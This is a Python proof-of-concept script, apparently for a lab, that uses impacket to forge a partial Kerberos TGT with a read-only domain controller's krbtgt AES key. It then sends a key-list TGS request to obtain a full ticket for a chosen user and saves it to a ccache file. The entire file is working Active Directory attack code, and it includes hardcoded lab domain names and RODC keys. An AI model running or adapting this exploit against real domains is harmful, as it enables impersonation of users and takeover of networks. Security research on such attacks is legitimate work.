import datetime
import random
import string

from binascii import unhexlify
from pyasn1.codec.der import encoder
from impacket.krb5 import constants
from impacket.krb5.asn1 import Ticket as TicketAsn1, EncTicketPart, AP_REQ, seq_set, Authenticator, TGS_REQ, \
    seq_set_iter
from impacket.krb5.constants import ProtocolVersionNumber, TicketFlags, PrincipalNameType, encodeFlags, EncryptionTypes
from impacket.krb5.crypto import Key, _enctype_table, Enctype
from impacket.krb5.kerberosv5 import sendReceive
from impacket.krb5.types import KerberosTime, Principal, Ticket
try:
    rand = random.SystemRandom()
except NotImplementedError:
    rand = random
    pass


class POC:
    def __init__(self, options):
        self.__domain = options.domain
        self.__userName = options.userName
        self.__aesKeyRodc = options.aesKeyRodc
        self.__kdcHost = options.kdcHost
        self.__kvno = options.kvno


    def createPartialTGT(self):
        print('creating Partial TGT')
        # We need the ticket template
        partialTGT = TicketAsn1()
        partialTGT['tkt-vno'] = ProtocolVersionNumber.pvno.value
        partialTGT['realm'] = self.__domain
        partialTGT['sname'] = noValue
        partialTGT['sname']['name-type'] = PrincipalNameType.NT_SRV_INST.value
        partialTGT['sname']['name-string'][0] = 'krbtgt'
        partialTGT['sname']['name-string'][1] = self.__domain
        partialTGT['enc-part'] = noValue
        # RODC kvno (Int32) -> first 16 bits are using to identify the RODC, the remaining ones represent the kvno
        # 18341 (RODC) + 0 (kvno) = 1201995776
        partialTGT['enc-part']['kvno'] = self.__kvno << 16
        partialTGT['enc-part']['etype'] = EncryptionTypes.aes256_cts_hmac_sha1_96.value

        # We create the encrypted ticket part
        encTicketPart = EncTicketPart()
        # We need these flags: 01000000100000010000000000000000
        flags = list()
        flags.append(TicketFlags.forwardable.value)
        flags.append(TicketFlags.renewable.value)
        flags.append(TicketFlags.enc_pa_rep.value)

        #we fill in the encripted part
        encTicketPart['flags'] = encodeFlags(flags)
        encTicketPart['key'] = noValue
        encTicketPart['key']['keytype'] = partialTGT['enc-part']['etype']
        encTicketPart['key']['keyvalue'] = ''.join([random.choice(string.ascii_letters) for _ in range(32)])
        encTicketPart['crealm'] = self.__domain
        encTicketPart['cname'] = noValue
        encTicketPart['cname']['name-type'] = PrincipalNameType.NT_PRINCIPAL.value
        encTicketPart['cname']['name-string'] = noValue
        encTicketPart['cname']['name-string'][0] = self.__userName
        encTicketPart['transited'] = noValue
        encTicketPart['transited']['tr-type'] = 0
        encTicketPart['transited']['contents'] = ''
        encTicketPart['authtime'] = KerberosTime.to_asn1(datetime.datetime.utcnow())
        encTicketPart['starttime'] = KerberosTime.to_asn1(datetime.datetime.utcnow())
        # Let's extend the ticket's validity a lil bit
        ticketDuration = datetime.datetime.utcnow() + datetime.timedelta(days=int(120))
        encTicketPart['endtime'] = KerberosTime.to_asn1(ticketDuration)
        encTicketPart['renew-till'] = KerberosTime.to_asn1(ticketDuration)
        # We don't need PAC
        encTicketPart['authorization-data'] = noValue

        # We encode the encrpted part
        encodedEncTicketPart = encoder.encode(encTicketPart)
        # and we encrypt it with the RODC key
        cipher = _enctype_table[partialTGT['enc-part']['etype']]
        key = Key(cipher.enctype, unhexlify(self.__aesKeyRodc))
        # key usage 2 -> key tgt service
        cipherText = cipher.encrypt(key, 2, encodedEncTicketPart, None)

        partialTGT['enc-part']['cipher'] = cipherText
        sessionKey = encTicketPart['key']['keyvalue']

        return partialTGT, sessionKey

    def getFullTGT(self, partialTGT, sessionKey):
        print('creating TGS to request a Full TGT')

        ticket = Ticket()
        ticket.from_asn1(partialTGT)

        apReq = AP_REQ()
        apReq['pvno'] = 5
        apReq['msg-type'] = int(constants.ApplicationTagNumbers.AP_REQ.value)

        opts = list()
        apReq['ap-options'] = constants.encodeFlags(opts)
        seq_set(apReq, 'ticket', ticket.to_asn1)

        authenticator = Authenticator()
        authenticator['authenticator-vno'] = 5
        authenticator['crealm'] = partialTGT['realm'].asOctets()

        seq_set(authenticator, 'cname', options.userName.components_to_asn1)

        now = datetime.datetime.utcnow()
        authenticator['cusec'] = now.microsecond
        authenticator['ctime'] = KerberosTime.to_asn1(now)

        encodedAuthenticator = encoder.encode(authenticator)
        cipher = _enctype_table[partialTGT['enc-part']['etype']]
        keyAuth = Key(cipher.enctype, bytes(sessionKey))
        encryptedEncodedAuthenticator = cipher.encrypt(keyAuth, 7, encodedAuthenticator, None)

        apReq['authenticator'] = noValue
        apReq['authenticator']['etype'] = cipher.enctype
        apReq['authenticator']['cipher'] = encryptedEncodedAuthenticator

        tgsReq = TGS_REQ()
        tgsReq['pvno'] = 5
        tgsReq['msg-type'] = int(constants.ApplicationTagNumbers.TGS_REQ.value)
        tgsReq['padata'] = noValue
        tgsReq['padata'][0] = noValue
        tgsReq['padata'][0]['padata-type'] = int(constants.PreAuthenticationDataTypes.PA_TGS_REQ.value)
        encodedApReq = encoder.encode(apReq)
        tgsReq['padata'][0]['padata-value'] = encodedApReq
        tgsReq['padata'][1] = noValue
        tgsReq['padata'][1]['padata-type'] = int(constants.PreAuthenticationDataTypes.KERB_KEY_LIST_REQ.value)
        encodedKeyReq = encoder.encode([23], asn1Spec=SequenceOf(componentType=Integer()))
        tgsReq['padata'][1]['padata-value'] = encodedKeyReq

        reqBody = seq_set(tgsReq, 'req-body')

        opts = list()
        opts.append(constants.KDCOptions.canonicalize.value)

        reqBody['kdc-options'] = constants.encodeFlags(opts)
        serverName = Principal("krbtgt", type=PrincipalNameType.NT_SRV_INST.value)
        reqBody['sname']['name-type'] = PrincipalNameType.NT_SRV_INST.value
        reqBody['sname']['name-string'][0] = serverName
        reqBody['sname']['name-string'][1] = self.__domain
        reqBody['realm'] = options.domain

        now = datetime.datetime.utcnow() + datetime.timedelta(days=1)

        reqBody['till'] = KerberosTime.to_asn1(now)
        reqBody['nonce'] = rand.getrandbits(31)
        seq_set_iter(reqBody, 'etype',
                     (
                         int(cipher.enctype),
                         int(constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value),
                         int(constants.EncryptionTypes.rc4_hmac.value),
                         int(constants.EncryptionTypes.rc4_hmac_exp.value),
                         int(constants.EncryptionTypes.rc4_hmac_old_exp.value)
                     )
                     )

        message = encoder.encode(tgsReq)
        # Let's send our TGS Request, the response will include the FULL TGT!!!
        resp = sendReceive(message, options.domain, options.kdcHost)

        return resp

    def saveTicket(self, ticket, sessionKey):
        print ('Saving ticket in %s' % options.userName + '.ccache')
        cipher = _enctype_table[Enctype.AES256]
        key = Key(cipher.enctype, bytes(sessionKey))
        from impacket.krb5.ccache import CCache
        ccache = CCache()
        ccache.fromTGS(ticket, key, key)
        ccache.saveFile('%s' %options.userName + '.ccache')


if __name__ == '__main__':
    import argparse
    import sys

    try:
        import pyasn1
        from pyasn1.type.univ import noValue, SequenceOf, Integer
    except ImportError:
        print('This module needs pyasn1 installed')
        sys.exit(1)

    options = argparse.Namespace()
    #Azure ENV
    #options.userName = Principal('normal_user', type=constants.PrincipalNameType.NT_PRINCIPAL.value)
    #options.domain = 'secureauthlabs1.rocks'
    #options.kdcHost = 'ad01.secureauthlabs1.rocks'
    #RODC key
    #options.aesKeyRodc = b'63ae8c5ed215430d11017afa52bc3764b5c1faa501f0c6b50ffa9ada6bd3235a'
    #options.kvno = 18341

    #SPACELAND ENV
    options.userName = Principal('leandro', type=constants.PrincipalNameType.NT_PRINCIPAL.value)
    options.domain = 'spaceland.com'
    options.kdcHost = 'win-ser19.spaceland.com'
    #RODC
    options.aesKeyRodc = b'97b2d3f45f2300e14594d70cb6ff98c4303452a5c2ae8e446ad09d9cd22afb37'
    options.kvno = 27692

    poc = POC(options)

    try:
        partialTGT, sessionKey = poc.createPartialTGT()
        #we got the partial ticket, now we have to make a TGS req with this ticket to obtain a fully one
        fullTGT = poc.getFullTGT(partialTGT, sessionKey)
        #let's save the ticket
        poc.saveTicket(fullTGT, sessionKey)
    except Exception as e:
        import traceback

        traceback.print_exc()
        #print("!ERROR: " + str(e))